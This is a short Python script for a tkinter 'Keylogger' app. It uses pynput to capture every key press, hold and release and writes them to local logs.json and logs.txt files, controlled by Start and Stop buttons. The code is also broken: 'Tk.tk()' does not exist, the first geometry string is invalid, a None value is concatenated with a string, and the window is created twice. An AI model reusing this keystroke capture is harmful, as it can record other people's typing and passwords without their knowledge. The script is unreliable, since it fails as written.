from tkinter import Tk, Label, Button
from pynput import keyboard
import json

root =  Tk.tk()
root.geometry("150*200")
root.title("Keylogger Project")

key_list = []
x = False
key_strokes = None
listener = None

def update_txt_file(key):
    with open('logs.txt','w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes=key_strokes+str(key)
    update_txt_file(str(key_strokes))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'logs.json'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger")

label = Label(root, text="Click Start to begin keylogging.")
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack()

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack()

root.geometry("300x110")  # Set the window size to 300x110 pixels

root.mainloop()
